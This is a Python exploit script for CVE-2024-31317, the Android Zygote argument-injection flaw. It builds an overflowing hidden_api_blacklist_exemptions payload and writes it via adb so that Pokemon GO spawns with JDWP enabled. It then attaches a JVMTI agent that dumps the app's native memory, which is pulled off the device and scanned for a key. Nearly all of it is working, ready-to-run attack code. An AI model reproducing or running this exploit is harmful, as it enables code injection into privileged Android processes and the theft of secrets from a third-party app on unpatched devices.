#!/usr/bin/env python3
"""
Adapted CVE-2024-31317 payload generator for making PoGo debuggable.

Based on zygote-injection-toolkit's stage1.py, modified to:
- Target PoGo's UID (10287) instead of system (1000)
- Set --runtime-flags=1 (DEBUG_ENABLE_JDWP) without --invoke-with
- Skip the security patch date check
- Generate a payload that makes the NEXT PoGo spawn have JDWP enabled

Usage:
  python3 inject_pogo_debug.py              # Print the adb commands to run
  python3 inject_pogo_debug.py --execute    # Execute via adb directly

After injection:
  1. Force-stop PoGo: adb shell am force-stop com.nianticlabs.pokemongo
  2. Relaunch PoGo (tap icon or: adb shell monkey -p com.nianticlabs.pokemongo 1)
  3. PoGo spawns with JDWP enabled
  4. Attach JVMTI agent: adb shell cmd activity attach-agent <PID> /data/local/tmp/memdump_agent.so
  5. Pull dump: adb pull /sdcard/Download/pogo_native.bin /tmp/

NOTE: This exploit targets CVE-2024-31317 (patched June 2024).
The Fold4 is on the August 2023 patch level, so it's vulnerable.
"""

import subprocess
import sys
import time


# PoGo's UID from: adb shell dumpsys package com.nianticlabs.pokemongo | grep userId
POGO_UID = 10287
POGO_GID = 10287
POGO_PACKAGE = "com.nianticlabs.pokemongo"


def generate_payload(command: str) -> str:
    """
    Generate the hidden_api_blacklist_exemptions value for Android 12+.

    This creates a malformed exemptions string that overflows into
    Zygote's command buffer, injecting our arguments into the next
    process spawn.

    The injected process runs with:
    - UID/GID of PoGo (10287)
    - DEBUG_ENABLE_JDWP runtime flag (--runtime-flags=1)
    - PoGo's SELinux context
    - --invoke-with to run our command
    """
    raw_zygote_arguments = [
        f"--setuid={POGO_UID}",
        f"--setgid={POGO_GID}",
        f"--setgroups={POGO_GID}",
        "--runtime-args",
        # SELinux context must match what PoGo normally gets
        f"--seinfo=default:targetSdkVersion=33:complete",
        # Flag 1 = DEBUG_ENABLE_JDWP, allows debugger/JVMTI attachment
        "--runtime-flags=1",
        f"--nice-name={POGO_PACKAGE}",
        "--invoke-with",
        f"{command}#",
    ]

    zygote_arguments = "\n".join(
        [f"{len(raw_zygote_arguments):d}"] + raw_zygote_arguments
    )

    # Android 12+ payload format (from zygote-injection-toolkit)
    # 3000 newlines to stay below the 12,200 byte max read buffer
    # 5157 'A' padding to push our command to byte 8,192
    payload = "\n" * 3000 + "A" * 5157
    payload += zygote_arguments
    payload += "," + ",\n" * 1400

    return payload


def generate_jdwp_only_payload() -> str:
    """
    Alternative: payload that just enables JDWP on the next spawn without --invoke-with.
    Uses a harmless command that immediately exits, but the spawned process
    will have JDWP enabled due to --runtime-flags=1.
    """
    # Use /system/bin/true or a no-op as the invoke-with wrapper
    # The wrapper runs, does nothing, and the app starts normally but with debug flags
    command = "/system/bin/sh -c true"
    return generate_payload(command)


def generate_agent_load_payload() -> str:
    """
    Payload that loads our JVMTI memdump agent into PoGo's process.
    Uses --invoke-with to wrap PoGo's startup, loading the agent.
    """
    # The agent .so will be loaded via the wrap property mechanism
    command = "/data/local/tmp/memdump_agent.so"
    return generate_payload(command)


def print_manual_commands():
    """Print the adb commands the user needs to run."""
    # For the simplest approach: just enable JDWP, then use adb to attach agent
    payload = generate_jdwp_only_payload()

    print("=" * 60)
    print("CVE-2024-31317: Make PoGo spawn with JDWP enabled")
    print("=" * 60)
    print()
    print(f"Target: {POGO_PACKAGE} (UID {POGO_UID})")
    print()
    print("Step 1: Inject payload into Settings.Global")
    print("  (The payload is too large to paste — use --execute)")
    print()
    print("Step 2: Trigger zygote to read the payload")
    print("  adb shell am force-stop com.android.settings")
    print("  adb shell am start -a android.settings.SETTINGS")
    print()
    print("Step 3: Wait for injection, then force-stop PoGo")
    print("  adb shell am force-stop com.nianticlabs.pokemongo")
    print()
    print("Step 4: Relaunch PoGo (it spawns with JDWP enabled)")
    print("  adb shell monkey -p com.nianticlabs.pokemongo 1")
    print()
    print("Step 5: Find PoGo PID and attach agent")
    print("  adb shell pidof com.nianticlabs.pokemongo")
    print("  adb shell cmd activity attach-agent <PID> /data/local/tmp/memdump_agent.so")
    print()
    print("Step 6: Pull the dump")
    print("  adb pull /sdcard/Download/pogo_native.bin /tmp/")
    print("  adb pull /sdcard/Download/memdump_log.txt /tmp/")
    print()
    print("Step 7: Scan for key")
    print("  python3 /tmp/pbp_heap_scan.py /tmp/pogo_native.bin")


def execute_injection():
    """Execute the injection via adb."""
    payload = generate_jdwp_only_payload()

    print(f"[*] Target: {POGO_PACKAGE} (UID {POGO_UID})")
    print(f"[*] Payload size: {len(payload)} bytes")

    # Step 1: Clean up any previous payload
    print("[*] Cleaning up previous payload...")
    subprocess.run(
        ["adb", "shell", "settings", "delete", "global", "hidden_api_blacklist_exemptions"],
        capture_output=True
    )

    # Step 2: Write payload
    print("[*] Writing payload to Settings.Global...")
    result = subprocess.run(
        ["adb", "shell", "settings", "put", "global", "hidden_api_blacklist_exemptions", payload],
        capture_output=True, text=True
    )
    if result.returncode != 0:
        print(f"[!] Failed to write payload: {result.stderr}")
        return False

    # Step 3: Trigger Settings app to cause zygote to read the payload
    print("[*] Triggering zygote payload read...")
    subprocess.run(["adb", "shell", "am", "force-stop", "com.android.settings"], capture_output=True)
    time.sleep(0.25)
    subprocess.run(["adb", "shell", "am", "start", "-a", "android.settings.SETTINGS"], capture_output=True)

    # Step 4: Wait for injection
    print("[*] Waiting for injection (checking if setting was consumed)...")
    for i in range(20):
        result = subprocess.run(
            ["adb", "shell", "settings", "get", "global", "hidden_api_blacklist_exemptions"],
            capture_output=True, text=True
        )
        value = result.stdout.strip()
        if value == "null" or value == "":
            print("[+] Payload consumed! Injection successful.")
            break
        time.sleep(0.5)
    else:
        print("[!] Payload not consumed after 10s. Cleaning up...")
        subprocess.run(
            ["adb", "shell", "settings", "delete", "global", "hidden_api_blacklist_exemptions"],
            capture_output=True
        )
        return False

    # Step 5: Force-stop and relaunch PoGo
    print("[*] Force-stopping PoGo...")
    subprocess.run(["adb", "shell", "am", "force-stop", POGO_PACKAGE], capture_output=True)
    time.sleep(1)

    print("[*] Relaunching PoGo (should spawn with JDWP)...")
    subprocess.run(["adb", "shell", "monkey", "-p", POGO_PACKAGE, "1"], capture_output=True)
    time.sleep(3)

    # Step 6: Check if PoGo is running and find PID
    result = subprocess.run(["adb", "shell", "pidof", POGO_PACKAGE], capture_output=True, text=True)
    pid = result.stdout.strip()
    if pid:
        print(f"[+] PoGo running with PID: {pid}")
        print(f"[*] Attaching JVMTI agent...")
        result = subprocess.run(
            ["adb", "shell", "cmd", "activity", "attach-agent", pid, "/data/local/tmp/memdump_agent.so"],
            capture_output=True, text=True
        )
        print(f"    stdout: {result.stdout.strip()}")
        print(f"    stderr: {result.stderr.strip()}")
        print(f"[*] Wait a few seconds for dump to complete, then:")
        print(f"    adb pull /sdcard/Download/pogo_native.bin /tmp/")
        print(f"    python3 /tmp/pbp_heap_scan.py /tmp/pogo_native.bin")
    else:
        print("[!] PoGo not running — may have crashed on spawn")

    return True


if __name__ == "__main__":
    if "--execute" in sys.argv:
        execute_injection()
    else:
        print_manual_commands()
